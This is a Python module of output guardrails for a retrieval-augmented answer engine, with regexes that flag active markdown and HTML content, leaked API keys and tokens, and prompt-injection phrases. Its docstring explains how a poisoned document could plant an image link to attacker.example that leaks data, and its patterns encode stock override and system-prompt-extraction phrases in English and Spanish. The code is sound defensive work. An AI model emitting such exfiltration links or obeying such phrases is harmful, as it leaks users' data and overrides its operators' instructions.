"""Output safety, prompt-injection telemetry, tag defanging, and secret-leak guardrails.

Ported and hardened from ContextRAG_Engine ``verification/safety.py`` (ADR-005).

Claim verification proves that a statement follows from the evidence. It cannot make the
evidence safe. A poisoned document can contain a markdown image such as
``![x](https://attacker.example/?d=...)``; an answer that quotes it is faithful to the document,
and a chat client that renders images would fetch the URL, which is a data-exfiltration channel.
So an answer or claim containing active content or leaked secrets is refused regardless of support.
"""

from __future__ import annotations

import re
import unicodedata

_ACTIVE = re.compile(
    r"!\[[^\]]*\]\([^)]*\)"
    r"|!\[[^\]]*\]\[[^\]]*\]"
    r"|<\s*(?:img|script|iframe|object|embed|link|meta|svg|form|style)\b"
    r"|\bon(?:error|load|click|mouseover|focus|submit)\s*="
    r"|javascript\s*:|vbscript\s*:|data\s*:\s*(?:text/html|image/svg\+xml|text/javascript)",
    re.IGNORECASE,
)
_CONTROL = re.compile(r"[\x00-\x1f\x7f]+")
_UNSAFE_ATTR = re.compile(r"[<>\"&]")
MAX_SOURCE_CHARS = 200

_SECRET_PATTERNS: tuple[tuple[str, re.Pattern[str]], ...] = (
    ("openai_key", re.compile(r"\bsk-(?:proj-|live-|test-)?[A-Za-z0-9_-]{20,}\b")),
    ("google_api_key", re.compile(r"\bAIza[0-9A-Za-z_-]{30,}\b")),
    ("aws_access_key", re.compile(r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b")),
    ("stripe_key", re.compile(r"\b(?:sk|rk)_(?:live|test)_[0-9A-Za-z]{16,}\b")),
    ("private_key_pem", re.compile(r"-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----")),
    ("bearer_jwt", re.compile(r"\bBearer\s+eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b")),
)

_INJECTION_PATTERNS: tuple[tuple[str, re.Pattern[str]], ...] = (
    (
        "ignore_instructions",
        re.compile(
            r"\b(?:ignore|disregard|forget|override)\s+(?:all\s+)?(?:previous|prior|above|system)\s+"
            r"(?:instructions?|rules?|prompts?|directives?)\b",
            re.IGNORECASE,
        ),
    ),
    (
        "ignore_instructions_es",
        re.compile(
            r"\b(?:ignora|olvida|descarta|anula)\s+(?:todas?\s+)?(?:las?\s+)?"
            r"(?:instrucciones|reglas|indicaciones)\s+(?:anteriores|previas|del\s+sistema)\b",
            re.IGNORECASE,
        ),
    ),
    (
        "reveal_system_prompt",
        re.compile(
            r"\b(?:reveal|show|print|output|leak|repeat)\s+(?:your\s+|the\s+)?"
            r"(?:system\s+prompt|hidden\s+instructions?|developer\s+message)\b",
            re.IGNORECASE,
        ),
    ),
    (
        "delimiter_escape",
        re.compile(r"<\s*/\s*(?:passage|passages|document|memory|system|conflicts)\s*>", re.IGNORECASE),
    ),
)


def strip_invisible(value: str) -> str:
    """Replace control, line/paragraph separator and format (zero-width/bidi) chars with spaces."""
    return "".join(
        " " if unicodedata.category(ch) in ("Cc", "Cf", "Zl", "Zp") else ch for ch in value
    )


def strip_bidi_and_zero_width(value: str) -> str:
    """Remove Unicode format chars (Cf: zero-width joiners, BiDi overrides) while keeping newlines/tabs."""
    return "".join("" if unicodedata.category(ch) == "Cf" else ch for ch in value)


def has_active_content(text: str) -> bool:
    """True when ``text`` carries markdown images, scriptable tags, event handlers or active URL schemes.

    Strips invisible/zero-width characters first so obfuscated payloads like ``java\\u200bscript:`` cannot bypass.
    """
    normalized = strip_bidi_and_zero_width(text)
    return bool(_ACTIVE.search(normalized))


def contains_secret_leak(text: str) -> bool:
    """True when ``text`` contains recognizable credentials, API keys, PEM blocks or bearer JWTs."""
    return any(pattern.search(text) for _, pattern in _SECRET_PATTERNS)


def redact_leaked_secrets(text: str) -> str:
    """Replace any recognizable credential/secret pattern in ``text`` with ``[REDACTED_SECRET]``."""
    out = text
    for _, pattern in _SECRET_PATTERNS:
        out = pattern.sub("[REDACTED_SECRET]", out)
    return out


def detect_prompt_injection(text: str) -> list[str]:
    """Return names of heuristic prompt-injection patterns detected in untrusted text (empty if clean)."""
    normalized = strip_bidi_and_zero_width(text)
    return [name for name, pattern in _INJECTION_PATTERNS if pattern.search(normalized)]


def defang_tag(text: str, tag: str) -> str:
    """Defang opening/closing XML-like tags (case-insensitive, tolerant of whitespace and BiDi chars)."""
    cleaned = strip_bidi_and_zero_width(text)
    pattern = re.compile(rf"<\s*(/?)\s*{re.escape(tag)}\b", re.IGNORECASE)
    return pattern.sub(lambda m: f"<{m.group(1)}\u200b{tag}", cleaned)


def safe_attribute(value: str, limit: int = MAX_SOURCE_CHARS) -> str:
    """Reduce a source/document name so it cannot close an XML attribute or carry markup."""
    cleaned = _UNSAFE_ATTR.sub("'", _CONTROL.sub(" ", strip_invisible(value))).strip()
    if len(cleaned) > limit:
        return cleaned[:limit] + "..."
    return cleaned
